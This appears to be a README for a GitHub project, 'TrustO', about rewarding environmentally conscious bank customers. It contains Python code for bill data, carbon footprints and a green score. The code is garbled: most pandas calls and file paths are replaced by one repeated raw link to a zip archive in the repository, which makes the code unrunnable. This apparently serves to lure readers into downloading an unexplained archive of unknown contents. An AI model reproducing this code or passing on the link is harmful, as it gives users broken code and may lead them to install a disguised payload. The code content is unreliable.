# TrustO
Problem Statement: Incentivizing Environment-Conscious Customers
As consumer awareness about climate change grows, there is a noticeable shift towards adopting environmentally sustainable consumption patterns. The choices individuals make in their everyday lives—ranging from energy use to transportation—directly impact the success of national climate goals. For instance, India's goal to become net-zero by 2070 heavily relies on the collective green choices of its citizens.

However, despite the increasing demand for sustainability, financial institutions currently offer limited rewards or incentives that encourage consumers to make environmentally responsible decisions. Banks, in particular, are in a unique position to influence this shift by integrating climate-conscious behavior into their financial products and services.<!DOCTYPE html>
<html lang="en">



import pandas as pd

import pandas as pd

# Function to create individual bill CSV files
def create_bill_files(electricity_user, water_user, lpg_user):
    # Data for Electricity Bill (12 months)
    electricity_data = {
        "Username": [electricity_user] * 12,  # Use the input username for electricity
        "Month": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
        "Electricity Bill (₹)": [3500, 3400, 3700, 3600, 3900, 4100, 3800, 4000, 3950, 4300, 4500, 4200]
    }

    # Data for Water Bill (12 months)
    water_data = {
        "Username": [water_user] * 12,  # Use the input username for water
        "Month": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
        "Water Bill (₹)": [800, 780, 790, 770, 810, 820, 750, 740, 760, 730, 800, 820]
    }

    # Data for LPG Bill (12 months)
    lpg_data = {
        "Username": [lpg_user] * 12,  # Use the input username for LPG
        "Month": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
        "LPG Bill (₹)": [900, 920, 910, 930, 940, 950, 970, 990, 980, 960, 1000, 1050]
    }

    # Creating DataFrames
    electricity_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(electricity_data)
    water_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(water_data)
    lpg_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(lpg_data)

    # Saving individual DataFrames to CSV files
    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/electricity_bill_{electricity_user}.csv', index=False)
    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/water_bill_{water_user}.csv', index=False)
    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/lpg_bill_{lpg_user}.csv', index=False)

    print("Individual bill files created for respective users.")

# Function to create combined CSV file
def create_combined_file(electricity_user, water_user, lpg_user):
    # Load individual bill DataFrames
    electricity_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/electricity_bill_{electricity_user}.csv')
    water_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/water_bill_{water_user}.csv')
    lpg_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/lpg_bill_{lpg_user}.csv')

    # Merging DataFrames based on Month
    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(electricity_df, water_df, on=["Month"], suffixes=('_Electricity', '_Water'))
    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(combined_df, lpg_df, on=["Month"])

    # Saving the combined DataFrame to a CSV file
    https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(f'/content/combined_bills_{lpg_user}.csv', index=False)

    print("Combined bill file created.")

    return combined_df

# Main execution flow
# Prompt for individual usernames
electricity_username = input("Enter the username for Electricity Bill (e.g., user_e1): ")
water_username = input("Enter the username for Water Bill (e.g., user_w1): ")
lpg_username = input("Enter the username for LPG Bill (e.g., user_l1): ")

# Create individual bill files
create_bill_files(electricity_username, water_username, lpg_username)

# Prompt for the username to create the combined file
combined_username = input("Enter the username for the combined file (e.g., rohit): ")

# Create combined file
combined_file = create_combined_file(electricity_username, water_username, lpg_username)

# Display the combined bills
print("\nCombined Bills DataFrame:")
print(combined_file)

# Function to calculate carbon footprint
def calculate_carbon_footprint(combined_file_path):
    # Load the combined bills DataFrame
    combined_df = https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip(combined_file_path)

    # Assuming the following factors for calculation
    electricity_factor = 0.92  # kg CO₂ per kWh
    water_factor = 0.0005  # kg CO₂ per liter
    lpg_factor = 3.01  # kg CO₂ per kg

    # Calculate the carbon footprint for each month
    combined_df['Electricity Carbon Footprint (kg CO₂)'] = combined_df['Electricity Bill (₹)'] * electricity_factor
    combined_df['Water Carbon Footprint (kg CO₂)'] = combined_df['Water Bill (₹)'] * water_factor * 1000  # Assuming bill amount is in liters
    combined_df['LPG Carbon Footprint (kg CO₂)'] = combined_df['LPG Bill (₹)'] * lpg_factor  # Assuming bill amount is in kg

    # Total Carbon Footprint
    combined_df['Total Carbon Footprint (kg CO₂)'] = (combined_df['Electricity Carbon Footprint (kg CO₂)'] +
                                                        combined_df['Water Carbon Footprint (kg CO₂)'] +
                                                        combined_df['LPG Carbon Footprint (kg CO₂)'])

    # Save the carbon footprint data to a new CSV file
    carbon_footprint_file_path = 'https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip'
    combined_df[['Month', 'Electricity Carbon Footprint (kg CO₂)', 
                  'Water Carbon Footprint (kg CO₂)', 
                  'LPG Carbon Footprint (kg CO₂)', 
                  'Total Carbon Footprint (kg CO₂)']].to_csv(carbon_footprint_file_path, index=False)

    print(f"Carbon footprint data saved to {carbon_footprint_file_path}")
    return combined_df

# Main execution flow
combined_file_path = 'https://github.com/Rahul-25byte/TrustO/raw/refs/heads/main/kelter/O_Trust_2.0-alpha.3.zip'  # Assuming you saved the combined file with this name

# Calculate carbon footprint and get the DataFrame
carbon_footprint_df = calculate_carbon_footprint(combined_file_path)

# Display the carbon footprint DataFrame
print("\nCarbon Footprint DataFrame:")
print(carbon_footprint_df[['Month', 'Electricity Carbon Footprint (kg CO₂)', 
                            'Water Carbon Footprint (kg CO₂)', 
                            'LPG Carbon Footprint (kg CO₂)', 
                            'Total Carbon Footprint (kg CO₂)']])


import pandas as pd

# Constants
MAX_CF = 10000  # Maximum acceptable carbon footprint in kg
MAX_INVESTMENT = 10000  # Maximum green investment in currency
RENEWABLE_USAGE_MAX = 1.0  # Maximum renewable energy usage (100%)

# Weights
WEIGHT_CF = 0.33
WEIGHT_INVESTMENT = 0.33
WEIGHT_RENEWABLE = 0.34

# Function to calculate Green Score
def calculate_green_score(carbon_footprint, green_investment, renewable_energy_usage):
    # Calculate contributions
    cf_contribution = (MAX_CF - carbon_footprint) * WEIGHT_CF
    investment_contribution = (green_investment) * WEIGHT_INVESTMENT
    renewable_contribution = (renewable_energy_usage) * WEIGHT_RENEWABLE

    # Calculate Green Score
    green_score = cf_contribution + investment_contribution + renewable_contribution
    
    # Maximum possible score for normalization
    max_score = (MAX_CF * WEIGHT_CF) + (MAX_INVESTMENT * WEIGHT_INVESTMENT) + (RENEWABLE_USAGE_MAX * WEIGHT_RENEWABLE)

    # Normalize the Green Score
    normalized_green_score = (green_score / max_score) * 100

    return green_score, normalized_green_score

# User inputs for Rohit
rohit_carbon_footprint = 5000  # Carbon footprint in kg
rohit_green_investment = 2000  # Green investment in currency
rohit_renewable_energy_usage = 0.60  # Renewable energy usage as a fraction

# Calculate Green Score for Rohit
green_score, normalized_green_score = calculate_green_score(
    rohit_carbon_footprint,
    rohit_green_investment,
    rohit_renewable_energy_usage
)

# Display the results
print(f"Green Score: {green_score:.2f}")
print(f"Normalized Green Score (0 to 100): {normalized_green_score:.2f}")








